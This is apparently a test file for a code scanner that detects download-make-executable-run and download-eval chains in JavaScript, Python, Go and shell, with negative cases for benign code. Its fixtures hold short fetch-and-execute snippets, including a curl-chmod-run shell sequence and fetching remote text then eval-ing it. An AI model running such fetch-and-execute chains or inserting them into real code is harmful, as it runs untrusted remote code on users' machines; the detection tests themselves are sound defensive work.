import { describe, expect, it } from 'vitest';
import { scanFile } from '../../src/analysis/scan.js';

const chains = (path: string, content: string): string[] =>
  scanFile({ path, content, size: content.length, role: 'script' }).chains.map((c) => c.kind);

describe('download -> make executable -> execute across languages', () => {
  it.each([
    ['js', 'a.js', "const r = await fetch(url);\nfs.chmodSync(p, 0o755);\nexecSync('./tool');\n"],
    [
      'python',
      'a.py',
      "data = urlopen(u).read()\nopen('x','wb').write(data)\nos.chmod('x', 0o755)\nos.system('./x')\n",
    ],
    ['go', 'a.go', 'resp, _ := http.Get(u)\nos.Chmod(p, 0755)\nexec.Command(p).Run()\n'],
    ['shell', 'a.sh', 'curl -o x https://e.test/x\nchmod +x x\n./x\n'],
  ])('%s is an inferred chain', (_n, path, content) => {
    expect(chains(path, content)).toContain('download-chmod-exec');
  });

  it('a literal `chmod +x` line inside a JavaScript file is not a shell command and does not complete a chain', () => {
    expect(chains('a.js', 'const r = await fetch(url);\nchmod +x file\n./file\n')).toEqual([]);
  });

  it('ordinary API calls plus unrelated execution are not chains', () => {
    expect(chains('a.js', "const r = await axios.get(url);\nexecSync('git status');\n")).toEqual(
      [],
    );
    expect(chains('a.py', "r = requests.get(u)\nsubprocess.run(['ls'])\n")).toEqual([]);
  });

  it('chmod without a download is not a chain, and steps beyond the window are not stitched', () => {
    expect(chains('a.js', "fs.chmodSync(p, 0o755);\nexecSync('./tool');\n")).toEqual([]);
    const far = `const r = await fetch(url);\n${'// filler\nconst a = 1;\n'.repeat(60)}fs.chmodSync(p, 0o755);\nexecSync('./tool');\n`;
    expect(chains('a.js', far)).toEqual([]);
  });

  it('fetch followed by eval of the body is an inferred download-eval chain', () => {
    expect(
      chains('a.js', 'const r = await fetch(url);\nconst t = await r.text();\neval(t);\n'),
    ).toEqual(['download-eval']);
  });
});
